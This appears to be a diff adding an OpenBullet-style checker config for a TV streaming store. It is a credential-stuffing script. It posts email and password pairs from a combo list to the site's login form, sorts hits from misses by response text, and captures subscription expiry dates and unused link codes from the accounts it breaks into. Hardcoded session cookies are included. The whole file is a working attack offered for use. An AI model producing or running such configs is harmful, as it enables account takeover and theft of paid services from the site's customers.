@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "TV Stream Now",
+  "SuggestedBots": 5,
+  "LastModified": "2018-07-17T04:42:52.3779666+00:00",
+  "AdditionalInfo": "",
+  "Author": "Krackn",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Login REQUEST GET "https://store.tvstreamsnow.com/index.php?route=account/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#LOGIN_PAGE REQUEST POST "https://store.tvstreamsnow.com/index.php?route=account/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: __cfduid=d5222fbb8828135fdd7bb1df6f8896ddf1531791538; PHPSESSID=h5h2f0851372gh7kdevnvervf5; default=sd8fpvto4ics1ddum5tkf7l662; language=en-gb; currency=USD; PAPVisitorId=s8zJ3FeaaHwU1SlLVUOV1T2hnt2O2IUb" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "No match for E-Mail Address and/or Password" 
+  KEYCHAIN Success OR 
+    KEY "<h2>My Orders</h2>" 
+#Expires PARSE "<SOURCE>" LR "Subscription expires on" "</h5></div>" Recursive=FALSE -> CAP "Expires" "" "" 
+#Unused_Code? PARSE "<SOURCE>" LR " Link Code:</b> " "</td>" Recursive=TRUE -> CAP "Link Codes " "" "   -- Unused" 
